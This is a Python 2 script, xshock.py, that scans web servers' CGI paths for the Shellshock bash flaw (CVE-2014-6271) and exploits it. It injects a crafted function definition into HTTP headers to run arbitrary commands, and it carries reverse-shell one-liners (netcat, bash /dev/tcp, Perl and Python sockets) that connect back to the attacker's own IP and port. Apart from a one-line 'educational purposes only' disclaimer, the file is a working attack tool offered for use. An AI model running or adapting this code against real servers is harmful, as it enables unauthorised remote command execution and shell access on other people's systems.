#!/usr/bin/env python
#
# Created by SeCToR-X (_sector_x@hackermail.com)
# xshock.py, version 0.1 - Atrix Team http://atrixteam.blogspot.com.br/
# CVE-2014-6271, http://www.securityfocus.com/bid/70103/exploit
#
# Warning! This tool is for educational purposes only!

# libs that will be used in our program
import urllib2
import optparse
import netifaces
import time
import sys

banner = """
____  ___  _________.__                   __    
\   \/  / /   _____/|  |__   ____   ____ |  | __
 \     /  \_____  \ |  |  \ /  _ \_/ ___\|  |/ /
 /     \  /        \|   Y  (  <_> )  \___|    < 
/___/\  \/_______  /|___|  /\____/ \___  >__|_ \\
      \_/        \/      \/            \/     \/
Version 0.1, Created by SeCToR-X (_sector_x@hackermail.com)
Atrix Team http://atrixteam.blogspot.com.br/
"""

# main vars
dirs = []
shells = []
reverse_shells = []
default_port = "443"
default_secs = 2

# bind shells not in use yet, maybe in version 0.2
shells.append("nc -nlvp <rport> -e /bin/sh")
shells.append("nc -nlvp <rport> -e /bin/bash -i")
# reverse shells
reverse_shells.append("nc <rip> <rport> -e /bin/bash -i")
reverse_shells.append("bash -i >& /dev/tcp/<rip>/<rport> 0>&1")
reverse_shells.append("perl -e 'use Socket;$i=\"<rip>\";$p=<rport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
reverse_shells.append("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<rip>\",<rport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"")

def xshock_loadfiledir(dirfilename):
	dirfile = open(dirfilename, "r")
	diroutput = dirfile.readlines()

	for dirline in diroutput:
		direntry = dirline.rstrip('\r\n')
		dirs.append(direntry)

	dirfile.close()

# scan targets in filename, separeted by new line or single target
def xshock_scan(filename):

	if "://" in filename:
		output = []
		output.append(filename)
	else:
		hostfile = open(filename, "r")
		output = hostfile.readlines()

	print banner
	print "Scanning target(s)...\n\n"

	for line in output:
			urltarget = line.rstrip('\r\n')
			print "scanning: " + urltarget
			payload = {"XSHOCK" : "() { :;}; echo 'Vulnerable: YES'"}
			isvul=0
			
			for urldir in dirs:
				sys.stdout.write("testing: " + urldir + '\r')
				sys.stdout.flush()
				
				try:
					strurl = urltarget + urldir
					response = urllib2.Request(strurl, None, payload)
					content  = urllib2.urlopen(response)

					if 'Vulnerable' in content.info():
						isvul=1
						print strurl + " is vulnerable\n"
						break

					content.close()
					time.sleep(default_secs)
		
				except urllib2.HTTPError, e:
					continue
				except urllib2.URLError, e:
					print "problem on connecting. Leaving now..."
					sys.exit(0)

	if not isvul:
		print urltarget + " is not vulnerable\n"
	try:
		hostfile.close()
	except:
		pass

def xshock_exploit(url, command, shell):
	success=0
	if not "null" in shell:
		shellcmd = reverse_shells[int(shell)]
		shellcmd = shellcmd.replace("<rip>", addr)
		shellcmd = shellcmd.replace("<rport>", default_port)
		command = shellcmd
		
	try:
		payload = { 'User-Agent' : '() { :;}; /bin/bash -c "' + command  + '"' }
		response = urllib2.Request(url, None, payload)
		content  = urllib2.urlopen(response)
	except urllib2.HTTPError, e:
		if e.code == 500:
			success=1
			print "...Exploited with sucess..."
		else:
			print "exploit failed!!!"

	if not success:
		print "exploit failed!!!"

progArgs = optparse.OptionParser('usage: %prog <options>')
progArgs.add_option('-u', '--url', default=False, action="store", help="http or https://www.site.com",)
progArgs.add_option('-c', '--cmd', default=False, action="store", help="command to execute",)
progArgs.add_option('-r', '--reverse', default=False, action="store", help="reverse shell to use. See Readme for more detail",)
progArgs.add_option('-i', '--iface', default=False, action="store", help="interface to be used on reverse shell",)
progArgs.add_option('-p', '--port', default=False, action="store", help="port to be used on reverse shell",)
progArgs.add_option('-s', '--scan', default=False, action="store_true", help="scan only",)
progArgs.add_option('-f', '--filename', default=False, action="store", help="load hosts from file (work only with --scan)",)
progArgs.add_option('-d', '--dirfile', default=False, action="store", help="files to test in URL",)
progArgs.add_option('-t', '--time', default=False, action="store", help="time interval beetwen retry each request",)
options, null = progArgs.parse_args()

# get ip address of attacker machine. default is eth0
if options.iface:
	iface = options.iface
else:
	iface = 'eth0'

addr = netifaces.ifaddresses(iface)[2][0]['addr']

if not options.url and not options.filename:
	print banner
	progArgs.print_help()
	sys.exit(1)

# global var setting
if options.time:
	default_secs = int(options.time)

# scanning method 1
if options.url and options.scan:
	if not options.dirfile:
		dirs.append("/cgi-bin/test")
		dirs.append("/cgi-bin/test.cgi")
		dirs.append("/cgi-bin/status")
		dirs.append("/cgi-bin/status.cgi")
	else:
		xshock_loadfiledir(options.dirfile)

	xshock_scan(options.url)
	sys.exit(1)

# scanning method 2
elif options.filename and options.scan:
	if not options.dirfile:
		dirs.append("/cgi-bin/test")
		dirs.append("/cgi-bin/test.cgi")
		dirs.append("/cgi-bin/status")
		dirs.append("/cgi-bin/status.cgi")
	else:
		xshock_loadfiledir(options.dirfile)

	xshock_scan(options.filename)
	sys.exit(1)

# exploit method
if options.url and options.reverse:
	if options.port:
		default_port = options.port

	xshock_exploit(options.url, "", options.reverse)
else:
	xshock_exploit(options.url, options.cmd, "null")
